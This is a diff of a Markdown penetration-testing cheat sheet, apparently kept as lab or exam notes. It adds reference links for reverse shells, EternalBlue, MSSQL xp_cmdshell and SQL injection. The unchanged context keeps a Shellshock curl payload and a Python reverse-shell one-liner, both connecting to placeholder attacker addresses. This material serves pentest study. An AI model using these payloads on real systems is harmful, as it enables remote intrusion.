@@ -4,6 +4,9 @@
 </details>
 
 
+
+
+
 ## Recon
 
 * Port Scan (basics):
@@ -102,7 +105,10 @@
         ```
         curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTIM/cgi-bin/admin.cgi
         ```
-
+        
+        
+        
+        
 ## Reverse Sheel
 
 * Netcat OpenBSD (and also some Linux)
@@ -116,7 +122,11 @@
     export RHOST="<ATTACKER_IP>";export RPORT=<PORT>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
     ```
 
-* Reference: [LINK TO PAYLOAD ALL THE THINGS]
+* Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+
+
 
 ## After first shell
 
@@ -299,3 +309,23 @@
 
 * LinEnum:
     https://github.com/rebootuser/LinEnum
+
+* /* TODO */
+
+
+
+### Links
+
+* Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings
+* GTFOBins: https://gtfobins.github.io/gtfobins/nmap/
+* Windows XP SP1 privesc: https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+* SMB Share Enum: https://blog.codecentric.de/en/2017/11/penetration-test-training-lazysysadmin-1-vanilla-style/
+* SQL Server attack tips: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+* ColdFusion attack: https://chennylmf.medium.com/hackthebox-walkthrough-arctic-e0ae709fc121
+* Ethernal Blue: https://redteamzone.com/EternalBlue/
+* Webmin: https://netosec.com/pwnos-vulnhub-walkthrough/
+* https://dominicbreuker.com/post/htb_dropzone/ (see Public 111)
+* SQLi Payloads:
+    * Commands to test: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+    * MS SQL Client on Kali: https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell/
+    * How to use xp_cmdshell: https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/
